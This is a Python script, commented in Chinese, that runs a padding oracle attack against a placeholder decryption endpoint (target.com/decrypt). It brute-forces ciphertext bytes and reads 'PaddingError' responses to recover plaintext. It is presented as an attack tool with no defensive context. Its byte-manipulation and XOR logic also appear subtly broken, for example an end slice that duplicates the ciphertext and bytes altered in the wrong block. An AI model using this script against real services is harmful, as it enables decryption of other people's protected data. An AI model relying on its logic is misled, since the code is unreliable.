import requests
import urllib.parse

# 要攻擊的目標URL和參數名稱
url = "http://target.com/decrypt"
param_name = "ciphertext"

# 待攻擊的密文
ciphertext = "70309f98653e87df804263d5a0348f115c36bc7c2cddfe02ffd44528083635404815ed8c0f14ad8cbbb1c7bc12bf21725fa15c0e7ba326e433ec41ddfaf41d27aa18ce4381a61d187ecbdcc9740747d300b7f354bb68139f2306508a06a04fbe"

# 建立一個session，以保持同一個加密請求中的cookie和其他會話信息
session = requests.Session()

# 構造一個解密請求，其中密文中的最後一個字節已更改
fake_ciphertext = ciphertext
plaintext = ""

for i in range(32):
    # 逐字節解密，先從最後一個字節開始
    position = 31 - i
    
    for j in range(256):
        # 嘗試所有可能的字節值，將其附加到密文的最後一個字節前面
        fake_ciphertext = fake_ciphertext[:position*2] + "{:02x}".format(j) + fake_ciphertext[(position+1)*2:]
        
        # 將修改後的密文發送給服務器進行解密
        response = session.get(url, params={param_name: fake_ciphertext})
        
        # 如果服務器返回了填充錯誤，則表示這個字節是錯誤的，我們需要繼續嘗試其他值
        if "PaddingError" in response.text:
            continue
        # 如果服務器返回了其他錯誤信息，則可能是正確的，我們可以推斷出原始字節的值
        else:
            # 從服務器的響應中解析出填充後的明文塊
            padding_len = i + 1
            padding_value = "{:02x}".format(padding_len) * padding_len
            encrypted_block = fake_ciphertext[(position // 16) * 32:((position // 16) + 1) * 32]
            encrypted_block_bytes = bytes.fromhex(encrypted_block)
            decrypted_block_bytes = bytearray(encrypted_block_bytes)
            for k in range(padding_len):
                decrypted_block_bytes[15-k] ^= int(padding_value[k*2:k*2+2], 16) ^ (i+2)
            decrypted_block_bytes[15-padding_len+1] ^= (i+1)
            
            # 從明文塊中解析出原始字節的值
            plaintext_byte = decrypted_block_bytes[15-position%16]
            original_byte = plaintext_byte ^ j ^ (i+1)
            plaintext = "{:02x}".format(original_byte) + plaintext
            print("Found byte at position {}: {}".format(position, plaintext_byte))
            break
    
    # 將已經推斷出來的字節填充到加密請求中，以便推斷下一個字節
    padding_len = i + 1
    padding_value = "{:02x}".format(padding_len) * padding_len
    for k in range(padding_len):
        fake_ciphertext = fake_ciphertext[:-(2*(padding_len-k))] + "{:02x}".format(original_byte ^ (padding_len+1) ^ int(padding_value[k*2:k*2+2], 16)) + fake_ciphertext[-(2*(padding_len-k-1)):]

# 所有的字節都已經推斷出來，輸出原始明文
print("Decrypted plaintext: " + bytes.fromhex(plaintext).decode())